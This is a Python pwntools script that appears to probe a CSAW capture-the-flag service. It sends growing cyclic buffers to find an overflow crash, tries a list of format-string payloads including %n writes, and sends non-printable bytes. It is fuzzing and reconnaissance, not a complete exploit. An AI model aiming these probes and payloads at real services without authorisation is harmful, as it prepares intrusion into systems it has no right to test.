#!/usr/bin/env python3
from pwn import *
import string

def test_buffer(p, size):
    payload = cyclic(size)
    print(f"\n[*] Testing buffer size: {size}")
    try:
        p.sendline(payload)
        result = p.recvuntil(b'> ', timeout=1)
        print(f"[*] Response received: {result}")
        return result
    except EOFError:
        print("[!] Connection closed (possible crash)")
        return None

def test_format_string(p):
    format_strings = [
        b'%x ' * 10,
        b'%p ' * 10,
        b'%s ' * 5,
        b'%n%n%n%n',
        b'%x%x%x%x',
        b'AAAA.%p.%p.%p.%p',
        b'%d%d%d%d',
        b'%100x',
        b'%100c',
        b'%100d',
        b'%100s'
    ]

    for fmt in format_strings:
        print(f"\n[*] Testing format string: {fmt}")
        try:
            p.sendline(fmt)
            result = p.recvuntil(b'> ', timeout=1)
            print(f"[*] Result: {result}")
        except EOFError:
            print("[!] Connection closed")
            return

def test_special_chars():
    special_chars = [
        bytes([i]) for i in range(256)
        if chr(i) not in string.printable
    ]

    for char in special_chars:
        try:
            p = remote('pwn.chal.csaw.io', 4242)
            print(f"\n[*] Testing char: {char.hex()}")
            p.sendline(char * 10)
            result = p.recvuntil(b'> ', timeout=1)
            print(f"[*] Result: {result}")
            p.close()
        except EOFError:
            print("[!] Connection closed")
            p.close()
        except Exception as e:
            print(f"[!] Error: {e}")
            if 'p' in locals():
                p.close()

def main():
    # Test increasing buffer sizes
    sizes = [64, 128, 256, 512, 1024, 2048, 4096]
    for size in sizes:
        try:
            p = remote('pwn.chal.csaw.io', 4242)
            if test_buffer(p, size) is None:
                print(f"[!] Found potential buffer overflow at size {size}")
                break
            p.close()
        except Exception as e:
            print(f"[!] Error: {e}")
            if 'p' in locals():
                p.close()

    # Test format strings
    try:
        p = remote('pwn.chal.csaw.io', 4242)
        test_format_string(p)
        p.close()
    except Exception as e:
        print(f"[!] Error: {e}")
        if 'p' in locals():
            p.close()

    # Test special characters
    test_special_chars()

if __name__ == "__main__":
    main()

